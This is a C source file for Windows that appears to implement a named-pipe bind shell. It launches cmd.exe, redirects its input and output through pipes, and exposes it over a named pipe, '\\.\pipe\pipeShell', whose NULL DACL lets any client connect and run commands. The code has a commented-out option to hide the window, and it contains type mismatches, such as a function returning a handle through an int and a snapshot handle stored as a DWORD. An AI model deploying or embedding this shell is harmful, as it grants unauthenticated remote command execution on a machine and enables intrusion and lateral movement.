#include<windows.h>
#include<tlhelp32.h> //for uisng toolhelp
#define MAXBUF 65535

int stdOutErrToPipe(HANDLE hIn, HANDLE hOut);
int getChildHandle(DWORD parentPid);

int main(){
	HANDLE inr, inw, outr, outw, hPipe, hStatus;
	inr = inw = outr = outw = hPipe = hStatus = 0;
	CHAR* pipe = "\\\\.\\pipe\\pipeShell";
	CHAR cmd[MAXBUF], buffer[MAXBUF];

	//create anonymous pipe for stdin (r/w ends) 
	if (!CreatePipe(&inr, &inw, NULL, 0)) printf("CreatePipe in fail: %i\n", GetLastError());
	//makeinr stdin read end inherited to cmd.exe
	if (!SetHandleInformation(inr, HANDLE_FLAG_INHERIT, 1)) printf("SetHandleInformation in fail: %i\n", GetLastError());

	//create anonymous pipe for stdout (r/w ends) 
	if (!CreatePipe(&outr, &outw, NULL, 0)) printf("CreatePipe in fail: %i\n", GetLastError());
	//makeinr stdout write end inherited to cmd.exe
	if (!SetHandleInformation(outw, HANDLE_FLAG_INHERIT, 1)) printf("SetHandleInformation in fail: %i\n", GetLastError());

	//create security descriptor with NULL DACL(so anyone can read the pipe)
	SECURITY_DESCRIPTOR sd;
	if (!InitializeSecurityDescriptor(&sd, 1)) 
		printf("InitializeSecurityDescriptor fail: %i\n", GetLastError());
	if (!SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE)) 
		printf("SetSecurityDescriptorDacl fail: %i\n", GetLastError());
	//now put security descriptor -> security attribute --> new namepipe(where everyone can access), 
	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = &sd;

	hPipe = CreateNamedPipeA(pipe, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 4096 * 16,
		4096 * 16, NMPWAIT_USE_DEFAULT_WAIT, &sa);

	//setup/create cmd.exe process
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;// | STARTF_USESHOWWINDOW;
	//si.wShowWindow = SW_HIDE;
	si.hStdInput = inr;					//redirect cmd.exe stdin to inr
	si.hStdOutput = outw;				//redirect cmd.exe std out/err to outw
	si.hStdError = outw;
	CHAR* app = "C:\\Windows\\system32\\cmd.exe";

	if (!CreateProcessA(app, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		printf("CreateProcessA: %i\n", GetLastError());

	//wait for client to connect to namepipe
	if (!ConnectNamedPipe(hPipe, NULL)) printf("connectNamepipe piper fail: %i\n", GetLastError());

	while (1){
		DWORD avail, rd, wr, ret;
		avail = rd = wr = ret = 0;
		CHAR buf[MAXBUF];

		//move cmd.exe stdout/err to client pipe
		stdOutErrToPipe(outr, hPipe);

		//read commands from client pipe into buffer
		if (!ReadFile(hPipe, buffer, sizeof(buffer), &rd, NULL)) printf("readfile fail: %i\n", GetLastError());

		//write commaneds from buffer to cmd.exe stdin
		if (!WriteFile(inw, buffer, rd, &wr, NULL)) printf("writefile inw: %i\n", GetLastError());

		//wait for cmd.exe process commands
		if (WaitForSingleObject(pi.hProcess, 100) == -1) printf("wait for cmd.exe fail: %i\n", GetLastError());

		//find cmd.exe child commands's pid
		HANDLE hChild = getChildHandle(pi.dwProcessId);
		if (hChild)	//if found command pid, wait for it
			if (WaitForSingleObject(hChild, INFINITE) == -1)
				printf("wait child comand fail: %i\n", GetLastError());

		//wait for cmd.exe process commands
		if (WaitForSingleObject(pi.hProcess, 100) == -1) printf("wait cmd.exe fail: %i\n", GetLastError());

		//exit loop if cmd.exe dies
		DWORD exitCode;
		if (!GetExitCodeProcess(pi.hProcess, &exitCode))
			printf("GetExitCodeProcess fail: %i\n", GetLastError());
		if (exitCode != STILL_ACTIVE) break;
	}
	//printf("r/w done\n");
	//gets(buffer);
	return 0;
}

//move data from cmd.exe stdout/err to buffer than client pipe
int stdOutErrToPipe(HANDLE outr, HANDLE hPipe){
	DWORD avail, rd, wr, ret;
	avail = rd = wr = ret = 0;
	CHAR buf[MAXBUF];

	while (1){
		//does cmd.exe stdout/err have data?
		if (!PeekNamedPipe(outr, NULL, NULL, NULL, &avail, NULL))
			printf("PeekNamedPipe outr fail: %i\n", GetLastError());;
		//printf("outr data avail: %i\n", avail);
		if (!avail) break;

		//dump data from cmd.exe stdout/err into buffer
		if (!ReadFile(outr, buf, avail, &rd, NULL))
			printf("ReadFile outr fail: %i\n", GetLastError());
		//printf("outr data rd: %i\n", rd);
		if (!rd) break;

		//write data from buffer to client pipe
		if (!WriteFile(hPipe, buf, rd, &wr, NULL))
			printf("writefile hPipe fail: %i\n", GetLastError());
		//printf("hPipe data wr: %i\n", wr);
		if (!wr) break;
	}
	return 0;
}

//get child handel given parent Pid
int getChildHandle(DWORD parentPid){
	//take cmd.exe's process snapshot
	DWORD snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, parentPid);
	PROCESSENTRY32 pe;	//need PROCESSENTRY32 when using TH32CS_SNAPPROCESS
	pe.dwSize = sizeof(PROCESSENTRY32);
	DWORD childPid = 0;
	HANDLE hChild = 0;

	//iterate through cmd.exe module link list for child command pid(should have only one)
	if (Process32First(snap, &pe)){		//get firrst entry in process module link list
		do{
			if (pe.th32ParentProcessID == parentPid) {
				childPid = pe.th32ProcessID;
				printf("%i : %s : %i\n", pe.th32ProcessID, pe.szExeFile, pe.th32ParentProcessID);
			}
			//Process32Next(snap, &pe));
		} while (Process32Next(snap, &pe));	//go tio next list member
	}

	//if found, return process handle
	if (childPid){
		hChild = OpenProcess(SYNCHRONIZE, FALSE, childPid);

	}
	return hChild;
}